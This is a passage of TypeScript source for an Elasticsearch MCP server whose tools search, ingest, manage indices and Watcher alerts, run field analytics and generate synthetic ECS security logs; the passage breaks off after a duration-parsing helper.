#!/usr/bin/env node

/*
 * Copyright Elasticsearch B.V. and contributors
 * SPDX-License-Identifier: Apache-2.0
 */

import { z } from "zod";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { Client, estypes, ClientOptions } from "@elastic/elasticsearch";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import fs from "fs";

// Configuration schema with auth options
const ConfigSchema = z
  .object({
    url: z
      .string()
      .trim()
      .min(1, "Elasticsearch URL cannot be empty")
      .url("Invalid Elasticsearch URL format")
      .describe("Elasticsearch server URL"),

    apiKey: z
      .string()
      .optional()
      .describe("API key for Elasticsearch authentication"),

    username: z
      .string()
      .optional()
      .describe("Username for Elasticsearch authentication"),

    password: z
      .string()
      .optional()
      .describe("Password for Elasticsearch authentication"),

    caCert: z
      .string()
      .optional()
      .describe("Path to custom CA certificate for Elasticsearch"),
  })
  .refine(
    (data) => {
      // If username is provided, password must be provided
      if (data.username) {
        return !!data.password;
      }

      // If password is provided, username must be provided
      if (data.password) {
        return !!data.username;
      }

      // If apiKey is provided, it's valid
      if (data.apiKey) {
        return true;
      }

      // No auth is also valid (for local development)
      return true;
    },
    {
      message:
        "Either ES_API_KEY or both ES_USERNAME and ES_PASSWORD must be provided, or no auth for local development",
      path: ["username", "password"],
    }
  );

type ElasticsearchConfig = z.infer<typeof ConfigSchema>;

export async function createElasticsearchMcpServer(
  config: ElasticsearchConfig
) {
  const validatedConfig = ConfigSchema.parse(config);
  const { url, apiKey, username, password, caCert } = validatedConfig;

  const clientOptions: ClientOptions = {
    node: url,
  };

  // Set up authentication
  if (apiKey) {
    clientOptions.auth = { apiKey };
  } else if (username && password) {
    clientOptions.auth = { username, password };
  }

  // Set up SSL/TLS certificate if provided
  if (caCert) {
    try {
      const ca = fs.readFileSync(caCert);
      clientOptions.tls = { ca };
    } catch (error) {
      console.error(
        `Failed to read certificate file: ${
          error instanceof Error ? error.message : String(error)
        }`
      );
    }
  }

  const esClient = new Client(clientOptions);

  const server = new McpServer({
    name: "elasticsearch-mcp-server",
    version: "0.1.1",
  });

  // Tool 1: List indices
  server.tool(
    "list_indices",
    "List all available Elasticsearch indices",
    {},
    async () => {
      try {
        const response = await esClient.cat.indices({ format: "json" });

        const indicesInfo = response.map((index) => ({
          index: index.index,
          health: index.health,
          status: index.status,
          docsCount: index.docsCount,
        }));

        return {
          content: [
            {
              type: "text" as const,
              text: `Found ${indicesInfo.length} indices`,
            },
            {
              type: "text" as const,
              text: JSON.stringify(indicesInfo, null, 2),
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to list indices: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 2: Get mappings for an index
  server.tool(
    "get_mappings",
    "Get field mappings for a specific Elasticsearch index",
    {
      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the Elasticsearch index to get mappings for"),
    },
    async ({ index }) => {
      try {
        const mappingResponse = await esClient.indices.getMapping({
          index,
        });

        return {
          content: [
            {
              type: "text" as const,
              text: `Mappings for index: ${index}`,
            },
            {
              type: "text" as const,
              text: `Mappings for index ${index}: ${JSON.stringify(
                mappingResponse[index]?.mappings || {},
                null,
                2
              )}`,
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to get mappings: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 3: Search an index with simplified parameters
  server.tool(
    "search",
    "Perform an Elasticsearch search with the provided query DSL. Highlights are always enabled.",
    {
      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the Elasticsearch index to search"),

      queryBody: z
        .record(z.any())
        .refine(
          (val) => {
            try {
              JSON.parse(JSON.stringify(val));
              return true;
            } catch (e) {
              return false;
            }
          },
          {
            message: "queryBody must be a valid Elasticsearch query DSL object",
          }
        )
        .describe(
          "Complete Elasticsearch query DSL object that can include query, size, from, sort, etc."
        ),
    },
    async ({ index, queryBody }) => {
      try {
        // Get mappings to identify text fields for highlighting
        const mappingResponse = await esClient.indices.getMapping({
          index,
        });

        const indexMappings = mappingResponse[index]?.mappings || {};

        const searchRequest: estypes.SearchRequest = {
          index,
          ...queryBody,
        };

        // Always do highlighting
        if (indexMappings.properties) {
          const textFields: Record<string, estypes.SearchHighlightField> = {};

          for (const [fieldName, fieldData] of Object.entries(
            indexMappings.properties
          )) {
            if (fieldData.type === "text" || "dense_vector" in fieldData) {
              textFields[fieldName] = {};
            }
          }

          searchRequest.highlight = {
            fields: textFields,
            pre_tags: ["<em>"],
            post_tags: ["</em>"],
          };
        }

        const result = await esClient.search(searchRequest);

        // Extract the 'from' parameter from queryBody, defaulting to 0 if not provided
        const from = queryBody.from || 0;

        const contentFragments = result.hits.hits.map((hit) => {
          const highlightedFields = hit.highlight || {};
          const sourceData = hit._source || {};

          let content = "";

          for (const [field, highlights] of Object.entries(highlightedFields)) {
            if (highlights && highlights.length > 0) {
              content += `${field} (highlighted): ${highlights.join(
                " ... "
              )}\n`;
            }
          }

          for (const [field, value] of Object.entries(sourceData)) {
            if (!(field in highlightedFields)) {
              content += `${field}: ${JSON.stringify(value)}\n`;
            }
          }

          return {
            type: "text" as const,
            text: content.trim(),
          };
        });

        const metadataFragment = {
          type: "text" as const,
          text: `Total results: ${
            typeof result.hits.total === "number"
              ? result.hits.total
              : result.hits.total?.value || 0
          }, showing ${result.hits.hits.length} from position ${from}`,
        };

        return {
          content: [metadataFragment, ...contentFragments],
        };
      } catch (error) {
        console.error(
          `Search failed: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 4: Get shard information
  server.tool(
    "get_shards",
    "Get shard information for all or specific indices",
    {
      index: z
        .string()
        .optional()
        .describe("Optional index name to get shard information for"),
    },
    async ({ index }) => {
      try {
        const response = await esClient.cat.shards({
          index,
          format: "json",
        });

        const shardsInfo = response.map((shard) => ({
          index: shard.index,
          shard: shard.shard,
          prirep: shard.prirep,
          state: shard.state,
          docs: shard.docs,
          store: shard.store,
          ip: shard.ip,
          node: shard.node,
        }));

        const metadataFragment = {
          type: "text" as const,
          text: `Found ${shardsInfo.length} shards${
            index ? ` for index ${index}` : ""
          }`,
        };

        return {
          content: [
            metadataFragment,
            {
              type: "text" as const,
              text: JSON.stringify(shardsInfo, null, 2),
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to get shard information: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 5: Ingest document
  server.tool(
    "ingest_document",
    "Insert a document into an Elasticsearch index",
    {
      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the Elasticsearch index to insert into"),

      document: z
        .record(z.any())
        .refine(
          (val) => {
            try {
              JSON.parse(JSON.stringify(val));
              return true;
            } catch (e) {
              return false;
            }
          },
          {
            message: "document must be a valid JSON object"
          }
        )
        .describe("Document data to insert into the index"),

      id: z
        .string()
        .optional()
        .describe("Optional document ID. If not provided, Elasticsearch will generate one")
    },
    async ({ index, document, id }) => {
      try {
        const indexParams: estypes.IndexRequest = {
          index,
          body: document
        };

        if (id) {
          indexParams.id = id;
        }

        const result = await esClient.index(indexParams);

        return {
          content: [
            {
              type: "text" as const,
              text: `Successfully inserted document with ID: ${result._id}`,
            },
            {
              type: "text" as const,
              text: `Result: ${JSON.stringify({
                index: result._index,
                id: result._id,
                version: result._version,
                result: result.result
              }, null, 2)}`,
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to insert document: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 6: Bulk ingest documents
  server.tool(
    "bulk_ingest",
    "Insert multiple documents into an Elasticsearch index in a single request",
    {
      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the Elasticsearch index to insert into"),

      documents: z
        .array(z.record(z.any()))
        .min(1, "At least one document is required")
        .refine(
          (val) => {
            try {
              JSON.parse(JSON.stringify(val));
              return true;
            } catch (e) {
              return false;
            }
          },
          {
            message: "documents must be an array of valid JSON objects"
          }
        )
        .describe("Array of document data to insert into the index"),

      idField: z
        .string()
        .optional()
        .describe("Optional field name to use for document IDs. If provided, this field from each document will be used as its ID")
    },
    async ({ index, documents, idField }) => {
      try {
        // Prepare bulk operations
        const operations = [];

        for (const doc of documents) {
          // Add index action
          operations.push({
            index: {
              _index: index,
              ...(idField && doc[idField] ? { _id: doc[idField].toString() } : {})
            }
          });

          // Add document
          operations.push(doc);
        }

        const result = await esClient.bulk({
          operations
        });

        const successCount = result.items.filter(item => !item.index?.error).length;
        const errorCount = result.items.filter(item => item.index?.error).length;

        return {
          content: [
            {
              type: "text" as const,
              text: `Bulk operation completed with ${successCount} successful and ${errorCount} failed operations`,
            },
            {
              type: "text" as const,
              text: `Took: ${result.took}ms, Errors: ${result.errors}`,
            },
            ...(errorCount > 0 ? [{
              type: "text" as const,
              text: `Errors: ${JSON.stringify(
                result.items
                  .filter(item => item.index?.error)
                  .map(item => ({
                    id: item.index?._id,
                    error: item.index?.error
                  })),
                null,
                2
              )}`
            }] : [])
          ],
        };
      } catch (error) {
        console.error(
          `Failed to perform bulk operation: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 7: Create index
  server.tool(
    "create_index",
    "Create a new Elasticsearch index with optional mappings and settings",
    {
      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the new Elasticsearch index to create"),

      mappings: z
        .record(z.any())
        .optional()
        .describe("Optional mappings configuration for the index fields"),

      settings: z
        .record(z.any())
        .optional()
        .describe("Optional index settings like number of shards, replicas, etc.")
    },
    async ({ index, mappings, settings }) => {
      try {
        // Check if index already exists
        const indexExists = await esClient.indices.exists({ index });

        if (indexExists) {
          return {
            content: [
              {
                type: "text" as const,
                text: `Error: Index '${index}' already exists. Choose a different name or delete the existing index first.`,
              },
            ],
          };
        }

        // Prepare create index request
        const createIndexRequest: any = {
          index
        };

        // Add mappings and settings if provided
        if (mappings || settings) {
          createIndexRequest.mappings = mappings;
          createIndexRequest.settings = settings;
        }

        const result = await esClient.indices.create(createIndexRequest);

        return {
          content: [
            {
              type: "text" as const,
              text: `Successfully created index '${index}'`,
            },
            {
              type: "text" as const,
              text: `Result: ${JSON.stringify({
                acknowledged: result.acknowledged,
                shards_acknowledged: result.shards_acknowledged,
                index: result.index
              }, null, 2)}`,
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to create index: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 8: Create alert
  server.tool(
    "create_alert",
    "Create an Elasticsearch watcher alert based on query conditions",
    {
      name: z
        .string()
        .trim()
        .min(1, "Alert name is required")
        .describe("Name for this alert"),

      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the Elasticsearch index to monitor"),

      query: z
        .record(z.any())
        .describe("Elasticsearch query to determine when the alert should trigger"),

      schedule: z
        .string()
        .describe("Alert check schedule in cron format (e.g. '0 */1 * * * ?' for every minute)"),

      actionType: z
        .enum(["log", "index", "email", "webhook"])
        .describe("Type of action to perform when alert triggers"),

      actionDetails: z
        .record(z.any())
        .describe("Configuration details for the selected action type")
    },
    async ({ name, index, query, schedule, actionType, actionDetails }) => {
      try {
        // Check if watcher API is available
        try {
          await esClient.watcher.stats();
        } catch (error) {
          return {
            content: [
              {
                type: "text" as const,
                text: "Error: Watcher API is not available in your Elasticsearch installation or you don't have sufficient permissions.",
              },
            ],
          };
        }

        // Prepare the watcher definition
        const watchId = `mcp_alert_${name.toLowerCase().replace(/\s+/g, '_')}`;

        // Build the action based on actionType
        const action: Record<string, any> = {};

        switch (actionType) {
          case "log":
            action.logging = {
              text: actionDetails.message || `Alert triggered for ${name}`
            };
            break;
          case "index":
            action.index = {
              index: actionDetails.index || "alerts",
              doc_type: actionDetails.doc_type || "_doc"
            };
            break;
          case "email":
            action.email = {
              to: actionDetails.to || "alerts@example.com",
              subject: actionDetails.subject || `Alert: ${name} triggered`,
              body: {
                html: actionDetails.body || `Alert <b>${name}</b> was triggered`
              }
            };
            break;
          case "webhook":
            action.webhook = {
              method: actionDetails.method || "POST",
              host: actionDetails.host || "localhost",
              port: actionDetails.port || 8080,
              path: actionDetails.path || "/alert",
              body: actionDetails.body || `Alert ${name} triggered`
            };
            break;
        }

        // Create the watcher
        const watch = {
          trigger: {
            schedule: {
              cron: schedule
            }
          },
          input: {
            search: {
              request: {
                search_type: "query_then_fetch",
                indices: [index],
                body: {
                  query: query
                }
              }
            }
          },
          condition: {
            compare: {
              "ctx.payload.hits.total": {
                gt: 0
              }
            }
          },
          actions: {
            [`${actionType}_action`]: action
          }
        };

        // Put the watch
        const response = await esClient.watcher.putWatch({
          id: watchId,
          body: watch as any
        });

        return {
          content: [
            {
              type: "text" as const,
              text: `Successfully created alert "${name}" with ID: ${watchId}`,
            },
            {
              type: "text" as const,
              text: `Result: ${JSON.stringify({
                created: response.created,
                id: response._id,
                version: response._version
              }, null, 2)}`,
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to create alert: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 9: Get alerts
  server.tool(
    "get_alerts",
    "List all existing alerts (watches) in Elasticsearch",
    {},
    async () => {
      try {
        // Check if watcher API is available
        try {
          await esClient.watcher.stats();
        } catch (error) {
          return {
            content: [
              {
                type: "text" as const,
                text: "Error: Watcher API is not available in your Elasticsearch installation or you don't have sufficient permissions.",
              },
            ],
          };
        }

        // Get all watches with prefix mcp_alert_
        const response = await esClient.search({
          index: ".watches",
          body: {
            query: {
              prefix: {
                _id: "mcp_alert_"
              }
            }
          } as any
        });

        const alerts = response.hits.hits.map((hit) => ({
          id: hit._id || "",
          name: (hit._id || "").replace("mcp_alert_", "").replace(/_/g, " "),
          status: (hit._source as any)?.status?.state || "unknown",
          lastExecuted: (hit._source as any)?.status?.last_execution?.time || "never"
        }));

        return {
          content: [
            {
              type: "text" as const,
              text: `Found ${alerts.length} alerts`,
            },
            {
              type: "text" as const,
              text: JSON.stringify(alerts, null, 2),
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to get alerts: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 10: Delete alert
  server.tool(
    "delete_alert",
    "Delete an existing alert (watch) in Elasticsearch",
    {
      name: z
        .string()
        .trim()
        .min(1, "Alert name is required")
        .describe("Name of the alert to delete")
    },
    async ({ name }) => {
      try {
        // Check if watcher API is available
        try {
          await esClient.watcher.stats();
        } catch (error) {
          return {
            content: [
              {
                type: "text" as const,
                text: "Error: Watcher API is not available in your Elasticsearch installation or you don't have sufficient permissions.",
              },
            ],
          };
        }

        const watchId = `mcp_alert_${name.toLowerCase().replace(/\s+/g, '_')}`;

        // Check if watch exists first
        const exists = await esClient.watcher.getWatch({
          id: watchId
        }).catch(() => null);

        if (!exists) {
          return {
            content: [
              {
                type: "text" as const,
                text: `Alert "${name}" not found.`,
              },
            ],
          };
        }

        // Delete the watch
        const response = await esClient.watcher.deleteWatch({
          id: watchId
        });

        return {
          content: [
            {
              type: "text" as const,
              text: `Successfully deleted alert "${name}"`,
            },
            {
              type: "text" as const,
              text: `Result: ${JSON.stringify({
                found: response.found,
                version: response._version
              }, null, 2)}`,
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to delete alert: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 11: Query builder
  server.tool(
    "build_query",
    "Build an Elasticsearch query without writing raw JSON",
    {
      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the Elasticsearch index to query"),

      queryType: z
        .enum(["term", "match", "range", "exists", "wildcard", "multi_match", "bool"])
        .describe("Type of query to build"),

      field: z
        .string()
        .optional()
        .describe("Field name to query (not needed for bool queries)"),

      value: z
        .any()
        .optional()
        .describe("Value to search for (not needed for exists queries)"),

      operator: z
        .enum(["gt", "gte", "lt", "lte", "eq"])
        .optional()
        .describe("Operator for range queries (gt, gte, lt, lte)"),

      additionalFields: z
        .array(z.string())
        .optional()
        .describe("Additional fields for multi_match queries"),

      boolClauses: z
        .record(z.array(z.record(z.any())))
        .optional()
        .describe("Clauses for bool query (must, should, must_not, filter)"),

      size: z
        .number()
        .int()
        .min(1)
        .max(100)
        .default(10)
        .describe("Number of results to return"),

      from: z
        .number()
        .int()
        .min(0)
        .default(0)
        .describe("Offset for pagination"),

      sort: z
        .record(z.enum(["asc", "desc"]))
        .optional()
        .describe("Fields to sort by and their directions")
    },
    async ({ index, queryType, field, value, operator, additionalFields, boolClauses, size, from, sort }) => {
      try {
        // Build the query based on queryType
        let query: Record<string, any> = {};

        switch (queryType) {
          case "term":
            if (!field || value === undefined) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: Field and value are required for term queries",
                  },
                ],
              };
            }
            query = { term: { [field]: value } };
            break;

          case "match":
            if (!field || value === undefined) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: Field and value are required for match queries",
                  },
                ],
              };
            }
            query = { match: { [field]: value } };
            break;

          case "range":
            if (!field || !operator || value === undefined) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: Field, operator, and value are required for range queries",
                  },
                ],
              };
            }
            query = { range: { [field]: { [operator]: value } } };
            break;

          case "exists":
            if (!field) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: Field is required for exists queries",
                  },
                ],
              };
            }
            query = { exists: { field } };
            break;

          case "wildcard":
            if (!field || value === undefined) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: Field and value are required for wildcard queries",
                  },
                ],
              };
            }
            query = { wildcard: { [field]: value } };
            break;

          case "multi_match":
            if (!field || value === undefined || !additionalFields) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: Field, value, and additionalFields are required for multi_match queries",
                  },
                ],
              };
            }
            query = {
              multi_match: {
                query: value,
                fields: [field, ...additionalFields]
              }
            };
            break;

          case "bool":
            if (!boolClauses) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: boolClauses is required for bool queries",
                  },
                ],
              };
            }
            query = { bool: boolClauses };
            break;
        }

        // Build the complete search request
        const searchRequest: any = {
          index,
          body: {
            query,
            size,
            from
          }
        };

        // Add sort if provided
        if (sort && Object.keys(sort).length > 0) {
          searchRequest.body.sort = Object.entries(sort).map(([field, direction]) => ({
            [field]: { order: direction }
          }));
        }

        // For demonstration, return the query rather than executing it
        return {
          content: [
            {
              type: "text" as const,
              text: `Query built successfully:`,
            },
            {
              type: "text" as const,
              text: JSON.stringify(searchRequest, null, 2),
            },
            {
              type: "text" as const,
              text: "To execute this query, use the 'search' tool with the query part of this JSON.",
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to build query: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 12: Field analytics
  server.tool(
    "field_analytics",
    "Get statistical insights about fields in an Elasticsearch index",
    {
      index: z
        .string()
        .trim()
        .min(1, "Index name is required")
        .describe("Name of the Elasticsearch index to analyze"),

      field: z
        .string()
        .trim()
        .min(1, "Field name is required")
        .describe("Field name to analyze"),

      analyticType: z
        .enum(["stats", "cardinality", "percentiles", "histogram", "terms", "date_histogram"])
        .describe("Type of analytics to perform"),

      options: z
        .record(z.any())
        .optional()
        .describe("Additional options for the analytics")
    },
    async ({ index, field, analyticType, options }) => {
      try {
        // Get field mapping first to understand field type
        const mappingResponse = await esClient.indices.getMapping({
          index,
        });

        const fieldMapping = mappingResponse[index]?.mappings?.properties?.[field];

        if (!fieldMapping) {
          return {
            content: [
              {
                type: "text" as const,
                text: `Error: Field '${field}' not found in index '${index}'`,
              },
            ],
          };
        }

        // Build appropriate aggregation based on analyticType and field type
        const agg: Record<string, any> = {};

        switch (analyticType) {
          case "stats":
            agg[`${field}_stats`] = {
              stats: { field }
            };
            break;

          case "cardinality":
            agg[`${field}_cardinality`] = {
              cardinality: { field }
            };
            break;

          case "percentiles":
            agg[`${field}_percentiles`] = {
              percentiles: {
                field,
                percents: options?.percents || [1, 5, 25, 50, 75, 95, 99]
              }
            };
            break;

          case "histogram":
            if (!options?.interval) {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: "Error: Interval is required for histogram analytics",
                  },
                ],
              };
            }
            agg[`${field}_histogram`] = {
              histogram: {
                field,
                interval: options.interval
              }
            };
            break;

          case "terms":
            agg[`${field}_terms`] = {
              terms: {
                field,
                size: options?.size || 10
              }
            };
            break;

          case "date_histogram":
            if (fieldMapping.type !== 'date') {
              return {
                content: [
                  {
                    type: "text" as const,
                    text: `Error: Field '${field}' is not a date field. Current type: ${fieldMapping.type}`,
                  },
                ],
              };
            }
            agg[`${field}_date_histogram`] = {
              date_histogram: {
                field,
                calendar_interval: options?.interval || "1d"
              }
            };
            break;
        }

        // Execute the search with aggregation
        const searchResponse = await esClient.search({
          index,
          size: 0,  // We only want aggregation results, not docs
          body: {
            aggs: agg
          }
        } as any);

        // Extract and format aggregation results
        const aggResults = searchResponse.aggregations || {};

        // Format the results based on aggregation type
        let formattedResults: any;
        let description: string = "";

        switch (analyticType) {
          case "stats":
            formattedResults = aggResults[`${field}_stats`];
            description = `Statistical analysis for field '${field}':`;
            break;

          case "cardinality":
            formattedResults = {
              unique_values: (aggResults[`${field}_cardinality`] as any)?.value || 0
            };
            description = `Cardinality (unique values) analysis for field '${field}':`;
            break;

          case "percentiles":
            formattedResults = (aggResults[`${field}_percentiles`] as any)?.values || {};
            description = `Percentile distribution for field '${field}':`;
            break;

          case "histogram":
            const histBuckets = (aggResults[`${field}_histogram`] as any)?.buckets || [];
            formattedResults = histBuckets.map((bucket: any) => ({
              range: bucket.key,
              count: bucket.doc_count
            }));
            description = `Histogram analysis for field '${field}' with interval ${options?.interval}:`;
            break;

          case "terms":
            const termBuckets = (aggResults[`${field}_terms`] as any)?.buckets || [];
            formattedResults = termBuckets.map((bucket: any) => ({
              value: bucket.key,
              count: bucket.doc_count
            }));
            description = `Top terms for field '${field}':`;
            break;

          case "date_histogram":
            const dateBuckets = (aggResults[`${field}_date_histogram`] as any)?.buckets || [];
            formattedResults = dateBuckets.map((bucket: any) => ({
              date: bucket.key_as_string || bucket.key,
              count: bucket.doc_count
            }));
            description = `Date histogram for field '${field}' with interval ${options?.interval || "1d"}:`;
            break;
        }

        return {
          content: [
            {
              type: "text" as const,
              text: description,
            },
            {
              type: "text" as const,
              text: JSON.stringify(formattedResults, null, 2),
            },
          ],
        };
      } catch (error) {
        console.error(
          `Failed to analyze field: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Tool 13: Security log generator
  server.tool(
    "generate_security_logs",
    "Generate realistic security logs in ECS format for security testing and analysis",
    {
      eventType: z
        .enum([
          "authentication",
          "network_traffic",
          "firewall",
          "file_access",
          "process",
          "intrusion_detection",
          "dns",
          "tls",
          "http"
        ])
        .describe("Type of security event to generate"),

      count: z
        .number()
        .int()
        .min(1)
        .max(1000)
        .default(10)
        .describe("Number of log entries to generate"),

      timeRange: z
        .object({
          start: z.string().default("now-7d"),
          end: z.string().default("now")
        })
        .optional()
        .describe("Time range for generated events (e.g., start: 'now-7d', end: 'now')"),

      sourceIpRange: z
        .string()
        .optional()
        .default("10.0.0.0/8,172.16.0.0/12,192.168.0.0/16")
        .describe("IP range for source IPs (comma-separated CIDR notation)"),

      destinationIpRange: z
        .string()
        .optional()
        .default("0.0.0.0/0")
        .describe("IP range for destination IPs (comma-separated CIDR notation)"),

      targetIndex: z
        .string()
        .optional()
        .describe("Index to ingest the generated logs into (if not provided, logs are only returned)"),

      additionalFields: z
        .record(z.any())
        .optional()
        .describe("Additional fields to include in each log entry")
    },
    async ({
      eventType,
      count,
      timeRange = { start: "now-7d", end: "now" },
      sourceIpRange = "10.0.0.0/8,172.16.0.0/12,192.168.0.0/16",
      destinationIpRange = "0.0.0.0/0",
      targetIndex,
      additionalFields = {}
    }) => {
      try {
        // Parse time range
        const startDate = timeRange.start === "now"
          ? new Date()
          : timeRange.start.startsWith("now-")
            ? new Date(Date.now() - parseDuration(timeRange.start.substring(4)))
            : new Date(timeRange.start);

        const endDate = timeRange.end === "now"
          ? new Date()
          : timeRange.end.startsWith("now-")
            ? new Date(Date.now() - parseDuration(timeRange.end.substring(4)))
            : new Date(timeRange.end);

        // Parse IP ranges
        const sourceIps = parseIpRanges(sourceIpRange);
        const destinationIps = parseIpRanges(destinationIpRange);

        // Generate security logs based on eventType
        const logs = [];

        for (let i = 0; i < count; i++) {
          // Generate timestamp within the range
          const timestamp = new Date(
            startDate.getTime() + Math.random() * (endDate.getTime() - startDate.getTime())
          ).toISOString();

          // Generate common ECS fields
          const commonFields = {
            "@timestamp": timestamp,
            "event.created": timestamp,
            "event.kind": "event",
            "event.category": getCategoryFromEventType(eventType),
            "event.type": eventType,
            "event.outcome": Math.random() > 0.7 ? "failure" : "success",
            "host.name": generateHostname(),
            "host.id": generateUuid(),
            "host.ip": getRandomItem(sourceIps),
          };

          // Generate specific event fields based on eventType
          let eventSpecificFields: Record<string, any> = {};

          switch (eventType) {
            case "authentication":
              eventSpecificFields = generateAuthenticationEvent();
              break;

            case "network_traffic":
              eventSpecificFields = generateNetworkTrafficEvent(sourceIps, destinationIps);
              break;

            case "firewall":
              eventSpecificFields = generateFirewallEvent(sourceIps, destinationIps);
              break;

            case "file_access":
              eventSpecificFields = generateFileAccessEvent();
              break;

            case "process":
              eventSpecificFields = generateProcessEvent();
              break;

            case "intrusion_detection":
              eventSpecificFields = generateIntrusionDetectionEvent(sourceIps, destinationIps);
              break;

            case "dns":
              eventSpecificFields = generateDnsEvent(sourceIps, destinationIps);
              break;

            case "tls":
              eventSpecificFields = generateTlsEvent(sourceIps, destinationIps);
              break;

            case "http":
              eventSpecificFields = generateHttpEvent(sourceIps, destinationIps);
              break;
          }

          // Merge all fields
          const logEntry = {
            ...commonFields,
            ...eventSpecificFields,
            ...additionalFields
          };

          logs.push(logEntry);
        }

        // Ingest into Elasticsearch if targetIndex is provided
        if (targetIndex) {
          // Check if index exists
          const indexExists = await esClient.indices.exists({ index: targetIndex });

          // Create index with ECS mappings if it doesn't exist
          if (!indexExists) {
            await esClient.indices.create({
              index: targetIndex,
              body: {
                mappings: getEcsMappingsForEventType(eventType)
              }
            } as any);
          }

          // Bulk ingest logs
          const bulkOperations = [];

          for (const log of logs) {
            bulkOperations.push({ index: { _index: targetIndex } });
            bulkOperations.push(log);
          }

          const bulkResponse = await esClient.bulk({
            operations: bulkOperations
          });

          // Return information about ingested logs
          return {
            content: [
              {
                type: "text" as const,
                text: `Generated ${logs.length} ${eventType} logs.`,
              },
              {
                type: "text" as const,
                text: `Ingested into '${targetIndex}' index with ${bulkResponse.items.filter(i => !i.index?.error).length} successful and ${bulkResponse.items.filter(i => i.index?.error).length} failed operations.`,
              },
              {
                type: "text" as const,
                text: `Sample log entry:\n${JSON.stringify(logs[0], null, 2)}`,
              },
            ],
          };
        } else {
          // Return generated logs
          return {
            content: [
              {
                type: "text" as const,
                text: `Generated ${logs.length} ${eventType} logs.`,
              },
              {
                type: "text" as const,
                text: `Sample log entry:\n${JSON.stringify(logs[0], null, 2)}`,
              },
              {
                type: "text" as const,
                text: `To ingest these logs, provide a 'targetIndex' parameter.`,
              },
            ],
          };
        }
      } catch (error) {
        console.error(
          `Failed to generate security logs: ${
            error instanceof Error ? error.message : String(error)
          }`
        );
        return {
          content: [
            {
              type: "text" as const,
              text: `Error: ${
                error instanceof Error ? error.message : String(error)
              }`,
            },
          ],
        };
      }
    }
  );

  // Helper functions for security log generation

  function parseDuration(duration: string): number {
    const unit = duration.slice(-1);
    const value = parseInt(duration.slice(0, -1));

    switch (unit) {
      case 's': return value * 1000; // seconds
      case 'm': return value * 60 * 1000; // minutes
      case 'h': return value * 60 * 60 * 1000; // hours
      case 'd': return value * 24 * 60 * 60 * 1000; // days
      case 'w': return value * 7 * 24 * 60 * 60 * 1000; // weeks
      case 'M': return value * 30 * 24 * 60 * 60 * 1000; // months (approximate)
      case 'y': return value * 365 * 24 * 60 * 60 * 1000; // years (approximate)
      default: return 0;
    }
  }

